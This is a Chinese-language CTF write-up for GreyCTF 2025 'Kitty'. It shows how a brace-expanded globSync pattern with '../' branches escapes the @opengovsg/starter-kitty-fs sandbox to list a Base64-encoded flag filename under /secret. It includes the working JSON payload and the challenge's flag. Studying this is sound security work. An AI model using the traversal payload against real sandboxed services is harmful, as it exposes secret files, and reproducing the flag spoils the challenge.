# GreyCTF 2025 Kitty Writeup

## 题目简述

服务使用 `@opengovsg/starter-kitty-fs`，为每个请求创建临时 sandbox，并允许调用该库白名单中的任意文件操作。flag 不以文件内容保存在应用目录，而是在镜像构建时被 Base64 编码后放进 `/secret/flag-<base64>` 的文件名中。

目标是利用 `globSync` 对 brace pattern 与父目录的处理绕过 sandbox 边界，枚举 `/secret` 下的文件名。

## 解题过程

接口只检查方法名是否在库导出的列表中，以及参数中是否直接出现数字：

```javascript
const { method, args } = req.body;
const result = sandboxedFs[method](...args);
```

它没有针对 glob 模式做额外限制。向根路径提交：

```json
{
  "method": "globSync",
  "args": ["{../,a}/{../,a}/{../,a}/{../,a}/secret/flag-*"]
}
```

每个 `{../,a}` 都有“向上一级”与普通目录名两个分支。brace 展开与 glob 遍历发生在安全封装的路径判断之外，其中一个组合会从形如 `/app/sandbox/<临时目录>` 的基准一路返回文件系统根目录，最终匹配 `/secret/flag-*`。其他 `a` 分支只负责让模式保持为库可接受的复合表达式。

Dockerfile 明确给出了 flag 的存放方式：

```dockerfile
RUN mv /app/flag.txt /secret/flag-$(cat /app/flag.txt | base64 -w0)
```

因此不需要继续读取文件内容。截取 glob 返回文件名中 `flag-` 后的部分，做一次 Base64 解码即可得到：

```text
grey{6l0b5_4r3_7r1cky}
```

## 方法总结

文件沙箱不能只包装常规的 `readFile`、`writeFile` 路径。glob、brace expansion、符号链接和返回绝对路径的枚举接口都有各自的规范化时机；若“检查路径”和“展开模式”顺序不同，就可能越界。这里 flag 被放入文件名又使目录枚举直接等价于秘密读取，进一步放大了 `globSync` 穿越的影响。
